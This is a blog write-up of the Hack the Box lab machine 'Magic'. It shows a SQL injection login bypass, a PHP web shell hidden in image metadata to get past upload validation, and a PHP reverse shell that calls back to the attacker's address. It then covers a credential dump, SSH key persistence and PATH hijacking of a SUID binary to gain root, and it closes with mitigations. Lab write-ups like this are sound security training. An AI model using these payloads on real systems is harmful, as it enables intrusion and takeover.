<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="Hack the Box - Magic" /><meta property="og:locale" content="en" /><meta name="description" content="This is my guide to the HackTheBox Linux machine Magic." /><meta property="og:description" content="This is my guide to the HackTheBox Linux machine Magic." /><link rel="canonical" href="https://tid4l.github.io/posts/HTB-Magic/" /><meta property="og:url" content="https://tid4l.github.io/posts/HTB-Magic/" /><meta property="og:site_name" content="TidalSec" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2020-05-02T13:00:00-05:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Hack the Box - Magic" /><meta name="twitter:site" content="@twitter_username" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2020-05-02T13:00:00-05:00","datePublished":"2020-05-02T13:00:00-05:00","description":"This is my guide to the HackTheBox Linux machine Magic.","headline":"Hack the Box - Magic","mainEntityOfPage":{"@type":"WebPage","@id":"https://tid4l.github.io/posts/HTB-Magic/"},"url":"https://tid4l.github.io/posts/HTB-Magic/"}</script><title>Hack the Box - Magic | TidalSec</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="TidalSec"><meta name="application-name" content="TidalSec"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get MODE_ATTR() { return "data-mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } static get ID() { return "mode-toggle"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } let self = this; /* always follow the system prefers */ this.sysDarkPrefers.addEventListener("change", () => { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.notify(); }); } /* constructor() */ get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode === ModeToggle.DARK_MODE; } get isLightMode() { return this.mode === ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer)) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } setDark() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_ATTR); sessionStorage.removeItem(ModeToggle.MODE_KEY); } /* Notify another plugins that the theme mode has changed */ notify() { window.postMessage({ direction: ModeToggle.ID, message: this.modeStatus }, "*"); } } /* ModeToggle */ const toggle = new ModeToggle(); function flipMode() { if (toggle.hasMode) { if (toggle.isSysDarkPrefer) { if (toggle.isLightMode) { toggle.clearMode(); } else { toggle.setLight(); } } else { if (toggle.isDarkMode) { toggle.clearMode(); } else { toggle.setDark(); } } } else { if (toggle.isSysDarkPrefer) { toggle.setLight(); } else { toggle.setDark(); } } toggle.notify(); } /* flipMode() */ </script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src=" /assets/img/avi/avi.jpg " alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">TidalSec</a></div><div class="site-subtitle font-italic">Cybersecurity.</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <button class="mode-toggle btn" aria-label="Switch Mode"> <i class="fas fa-adjust"></i> </button> <span class="icon-border"></span> <a href="https://github.com/tid4l" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/twitter_username" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['example','doamin.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>Hack the Box - Magic</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Hack the Box - Magic</h1><div class="post-meta text-muted"><div> By <em> <a href="https://twitter.com/username">Chris</a> </em></div><div class="d-flex"><div> <span> Posted <em class="timeago" data-ts="1588442400" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2020-05-02 </em> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1511 words"> <em>8 min</em> read</span></div></div></div><div class="post-content"><p>This is my guide to the HackTheBox Linux machine <em>Magic</em>.</p><hr /><blockquote class="prompt-warning"><div><p>These HTB writeups have been migrated from a standalone repository for ease of access. However, I wrote these to learn and can’t attest to the accuracy of my thoughts.</p></div></blockquote><p><img data-src="/assets/img/posts/htb/05-2020/info.PNG" alt="" data-proofer-ignore> <em>Task: Find <a href="#user-flag">user.txt</a> and <a href="#root-flag">root.txt</a></em></p><h2 id="penetration-methodologies"><span class="mr-2">Penetration Methodologies</span><a href="#penetration-methodologies" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p><strong>Scanning</strong></p><ul><li>nmap</ul><p><strong>Enumeration</strong></p><ul><li><p>Webpage enumeration</p><li><p>Database dumping</p></ul><p><strong>Exploitation</strong></p><ul><li><p>SQL injection</p><li><p>Improper image validation</p></ul><p><strong>Priv Esc</strong></p><ul><li><p>SUID Binaries</p><li><p>Path variable abuse</p></ul><h2 id="user-flag"><span class="mr-2">User Flag</span><a href="#user-flag" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>Our first step is to scan <em>Magic</em> with <code class="language-plaintext highlighter-rouge">nmap</code>.</p><ul><li><p><strong>sC</strong>: Enable common scripts</p><li><p><strong>sV</strong>: version and service on the port</p><li><p><strong>O</strong>: remote OS detection using fingerprinting</p></ul><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
</pre><td class="rouge-code"><pre># Nmap 7.80 scan initiated Mon Jun  1 15:06:51 2020 as: nmap -sC -sV -O -oA scan185 10.10.10.185
Nmap scan report for 10.10.10.185
Host is up (0.097s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 06:d4:89:bf:51:f7:fc:0c:f9:08:5e:97:63:64:8d:ca (RSA)
|   256 11:a6:92:98:ce:35:40:c7:29:09:4f:6c:2d:74:aa:66 (ECDSA)
|_  256 71:05:99:1f:a8:1b:14:d6:03:85:53:f8:78:8e:cb:88 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Magic Portfolio
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=6/1%OT=22%CT=1%CU=37392%PV=Y%DS=2%DC=I%G=Y%TM=5ED5600E
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=10E%TI=Z%CI=Z%II=I%TS=A)OPS(
OS:O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST11
OS:NW7%O6=M54DST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(
OS:R=Y%DF=Y%T=40%W=FAF0%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS
OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=
OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=
OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T
OS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=
OS:S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Jun  1 15:07:42 2020 -- 1 IP address (1 host up) scanned in 51.19 seconds
</pre></table></code></div></div><p>Once the results return, we’ll also run a full port scan, which yields nothing of use. Two standard ports are open, 22 and 80, which indicates a webserver.</p><p>Let’s head over to the webpage.</p><p><img data-src="/assets/img/posts/htb/05-2020/webpage.png" alt="" data-proofer-ignore></p><p>The page looks like a simple image repository with a few dead links, and a log in. Let’s check out the log in page.</p><p><img data-src="/assets/img/posts/htb/05-2020/login.png" alt="" data-proofer-ignore></p><p>After trying a few default usernames and passwords, they don’t seem to work. Let’s attempt a SQL injection to see if this site is vulnerable. There a few tools that can help automate this process but we’ll quickly test a few options manually. <a href="https://www.securityidiots.com/Web-Pentest/SQL-Injection/bypass-login-using-sql-injection.html">This article</a> has some great information on bypassing logins with SQL injection vulnerabilities.</p><p>After a few tries, the following gets us logged in.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>username: ' or 1=1 --
password: ' or 1=1 --
</pre></table></code></div></div><p>It looks like we now have access to an image upload page.</p><p><img data-src="/assets/img/posts/htb/05-2020/upload.png" alt="" data-proofer-ignore></p><p>Uploading an image reveals that it can be accessed remotely via the URL path <code class="language-plaintext highlighter-rouge">http://10.10.10.185/images/uploads/image.jpg</code>. This indicates to us that if we can upload code, we can potentially open a reverse shell to the box.</p><p>Although unlikely, let’s try uploading a reverse shell script with the JPEG extension appended to the end.</p><p><img data-src="/assets/img/posts/htb/05-2020/error.png" alt="" data-proofer-ignore></p><p>No luck. There is some level of image validation occurring here, so let’s try a different route. Chances are, the validator is looking at the MIME type and the extension.</p><p>Using the <code class="language-plaintext highlighter-rouge">exiftool</code>, let’s add some simple PHP code to the comment metadata of an image that will allow RCE on the box, if it bypasses the validator.</p><p>Additionally, in order for our browser to execute the code injected in the image, we need to add the PHP extension to the image name, but we must still keep the JPEG extension at the end, as this will allow the image through.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">sudo </span>exiftool <span class="nt">-Comment</span><span class="o">=</span><span class="s1">'&lt;?php if(isset($_REQUEST['</span>cmd<span class="s1">'])){ echo "&lt;pre&gt;"; $cmd = ($_REQUEST['</span>cmd<span class="s1">']); system($cmd); echo "&lt;/pre&gt;"; die; }?&gt;'</span> sponge.jpg
<span class="nv">$ </span><span class="nb">mv </span>sponge.jpg sponge.php.jpg
</pre></table></code></div></div><p>Let’s try to get this uploaded.</p><p><img data-src="/assets/img/posts/htb/05-2020/success.png" alt="" data-proofer-ignore></p><p>Success! Using the following URL, we should be able to execute commands remotely: <code class="language-plaintext highlighter-rouge">http://10.10.10.185/images/uploads/photo.php.png?cmd=COMMAND</code></p><p>It looks like we are able to do so.</p><p><img data-src="/assets/img/posts/htb/05-2020/cmds.png" alt="" data-proofer-ignore></p><p>This is a bit clunky and the images are wiped after a certain period of time. Let’s see if we can use this command execution to get a reverse shell.</p><p>Firstly, we’ll start our <code class="language-plaintext highlighter-rouge">netcat</code> listener.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nv">$ </span>nc <span class="nt">-lvnp</span> 4444
</pre></table></code></div></div><p>If all goes well, the following PHP command plugged into the URL will open a reverse shell on the box and connect back to our machine.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>php <span class="nt">-r</span> <span class="s1">'$sock=fsockopen("10.10.15.2",4444);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</span>
</pre></table></code></div></div><p>Plugging it in as is, though, could cause some unwanted issues as the browser tries to interpret certain characters and breakpoints. Let’s use an online URL encoder to help mitigate this. This simply replaces the characters with something more concise for the browser to interpret.</p><p><img data-src="/assets/img/posts/htb/05-2020/encode.png" alt="" data-proofer-ignore></p><p>With our listener ready and our image payload uploaded, navigating to this link should open a reverse shell that connects to our attacking machine.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>http://10.10.10.185/images/uploads/sponge.php.jpg?cmd=php%20-r%20%27%24sock%3Dfsockopen%28%2210.10.15.2%22%2C4444%29%3Bexec%28%22%2Fbin%2Fsh%20-i%20%3C%263%20%3E%263%202%3E%263%22%29%3B%27
</pre></table></code></div></div><p>We successfully connect. Let’s run a python command to upgrade our shell.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nv">$ </span>python3 <span class="nt">-c</span> <span class="s1">'import pty;pty.spawn("/bin/bash");'</span>
</pre></table></code></div></div><p>We’ll have a look around. First things first, we are the www-data user and don’t currently have access to <code class="language-plaintext highlighter-rouge">user.txt</code> flag. But there appears to be a user, theseus, that may have access. Let’s try to escalate our privileges.</p><p>Within the Magic subdirectory of the webserver, we find a database file. Looking at the contents, we can see a password <code class="language-plaintext highlighter-rouge">iamkingtheseus</code>.</p><p><img data-src="/assets/img/posts/htb/05-2020/db-file.png" alt="" data-proofer-ignore></p><p>Using this password to change users to theseus doesn’t work, but we may be able to access the database to reveal further credentials. The command <code class="language-plaintext highlighter-rouge">mysqldump</code> is present on the box; we can use it to dump the login table in the <em>Magic</em> database.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nv">$ </span>mysqldump <span class="nt">-u</span> theseus <span class="nt">-piamkingtheseus</span> Magic login
</pre></table></code></div></div><p>The command executes correctly, and we can see values containing a username and password.</p><p><img data-src="/assets/img/posts/htb/05-2020/db-dump.png" alt="" data-proofer-ignore></p><p>Let’s re-attempt log in, this time with our new password.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="nv">$ </span>su theseus
Password: Th3s3usW4sK1ng
</pre></table></code></div></div><p>We log in as user theseus. Let’s grab the user flag. On to root!</p><p><img data-src="/assets/img/posts/htb/05-2020/user-flag.png" alt="" data-proofer-ignore></p><h2 id="root-flag"><span class="mr-2">Root Flag</span><a href="#root-flag" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>First thing we’ll do is add our public key, granting us a bit more reliable persistence to the machine. I usually reference <a href="https://linuxhandbook.com/add-ssh-public-key-to-server/">Linux Handbook</a> for details on how to do this.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">cd</span> /home/theseus/.ssh
<span class="nv">$ </span><span class="nb">printf</span> <span class="s2">"[public key]"</span> <span class="o">&gt;&gt;</span> authorized_keys
</pre></table></code></div></div><p>Now we can connect via SSH. First, though, let’s upload the <a href="https://github.com/diego-treitos/linux-smart-enumeration">Linux Smart enumeration</a> with secure copy.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nv">$ </span>scp lse.sh theseus@10.10.10.185:/tmp
</pre></table></code></div></div><p>Now, we’ll connect and run our enumeration script. One thing quickly stands out: it looks like an unusual SUID bit is set for the <code class="language-plaintext highlighter-rouge">sysinfo</code> command.</p><p><img data-src="/assets/img/posts/htb/05-2020/suid.png" alt="" data-proofer-ignore></p><p>Viewing the file information for <code class="language-plaintext highlighter-rouge">/bin/sysinfo</code> shows the owner is root and, because the SUID bit is set, this file with execute as the owner. Hacking Articles has a <a href="https://www.hackingarticles.in/linux-privilege-escalation-using-suid-binaries/">great write-up</a> detailing exactly how we can abuse SUID to escalate our privileges.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-al</span> /bin/sysinfo
<span class="nt">-rwsr-x---</span> 1 root <span class="nb">users </span>22040 Oct 21  2019 /bin/sysinfo
</pre></table></code></div></div><p>Let’s go ahead and upload pspy64, <a href="https://github.com/DominicBreuker/pspy">an unprivileged process spy</a>, and use it view exactly what is called and executed when we run <code class="language-plaintext highlighter-rouge">sysinfo</code>.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nv">$ </span>scp pspy64 theseus@10.10.10.185:/tmp
</pre></table></code></div></div><p>Running <code class="language-plaintext highlighter-rouge">sysinfo</code>, we can see it calls a couple commands, one of which is <code class="language-plaintext highlighter-rouge">lshw</code>.</p><p><img data-src="/assets/img/posts/htb/05-2020/processes.png" alt="" data-proofer-ignore></p><p>Because it does not specify the full path of the command, instead relying on the system <code class="language-plaintext highlighter-rouge">$PATH</code> variable, we can manipulate the path to execute whatever command we want. Hacking Articles has another <a href="https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/">article on this topic</a>.</p><p>First, we’ll create a file <code class="language-plaintext highlighter-rouge">lshw</code> in the <code class="language-plaintext highlighter-rouge">/tmp</code> directory. Then we will add the <code class="language-plaintext highlighter-rouge">/tmp</code> directory to the system path. When <code class="language-plaintext highlighter-rouge">sysinfo</code> is ran, it’ll execute our script first, opening a bash shell as root.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">cd</span> /tmp
<span class="nv">$ </span><span class="nb">echo</span> <span class="s2">"/bin/bash"</span> <span class="o">&gt;</span> lshw
<span class="nv">$ </span><span class="nb">chmod </span>777 lshw
<span class="nv">$ </span><span class="nb">echo</span> <span class="nv">$PATH</span>
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin/:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
<span class="nv">$ </span><span class="nb">export </span><span class="nv">PATH</span><span class="o">=</span>/tmp:<span class="nv">$PATH</span>
<span class="nv">$ </span>sysinfo
</pre></table></code></div></div><p>Running <code class="language-plaintext highlighter-rouge">sysinfo</code>, our root shell successfully spawns.</p><p><img data-src="/assets/img/posts/htb/05-2020/privesc.png" alt="" data-proofer-ignore></p><p>I had problems seeing the results of my commands in this shell so let’s add our public SSH key to root’s <code class="language-plaintext highlighter-rouge">authorized_keys</code> file.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>$ cd /root/.ssh
$ mkdir .ssh
$ printf "[public key]" &gt;&gt; authorized_keys
</pre></table></code></div></div><p>Finally, we’ll connect via SSH and capture the final flag!</p><p><img data-src="/assets/img/posts/htb/05-2020/root-flag.png" alt="" data-proofer-ignore></p><hr /><h2 id="mitigation"><span class="mr-2">Mitigation</span><a href="#mitigation" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><ul><li><p>Input validation to avoid SQL injection is very important. Bypassing a log in is pretty mild in comparison to dumping a database, but both are dangerous. Positive Technologies has some <a href="https://www.ptsecurity.com/ww-en/analytics/knowledge-base/how-to-prevent-sql-injection-attacks/#2">great information</a> to help mitigate the risk of this occurring.</p><li><p>In line with input validation, image validation is also of top priority. As this box demonstrates, weak validation can lead to remote code execution. At the least, there was some level of validation occurring, but only checking the last extension on a file is easily bypassed. OWASP has an awesome <a href="https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html">cheat sheet</a> detailing mitigation techniques for file upload vulnerabilities.</p><li><p>Avoid password reuse. Shared passwords between services is one of the easiest ways to escalate or move laterally.</p><li><p>Setting the SUID bit can be useful to allow users to run certain programs with a higher level of privilege and it does adhere to the security principle of Least Privilege, however, a system administrator must carefully consider the risks of enabling SUIDs. In this particular scenario, ensuring that the <code class="language-plaintext highlighter-rouge">sysinfo</code> program used full paths for the commands it executed would’ve prevented the path injection attack.</p></ul><h2 id="final-thoughts"><span class="mr-2">Final Thoughts</span><a href="#final-thoughts" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>This was a great box, one of my favorites, I enjoyed it at every step. It was certainly challenging and I learned a ton about basic web application vulnerabilities.</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/hack-the-box/'>Hack the Box</a>, <a href='/categories/linux/'>Linux</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/linux/" class="post-tag no-text-decoration" >linux</a> <a href="/tags/ctf/" class="post-tag no-text-decoration" >ctf</a> <a href="/tags/htb/" class="post-tag no-text-decoration" >htb</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Hack the Box - Magic - TidalSec&amp;url=https://tid4l.github.io/posts/HTB-Magic/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Hack the Box - Magic - TidalSec&amp;u=https://tid4l.github.io/posts/HTB-Magic/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https://tid4l.github.io/posts/HTB-Magic/&amp;text=Hack the Box - Magic - TidalSec" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/First-Post-and-Obligatory-Blog-Walkthrough/">First Post and Obligatory Blog 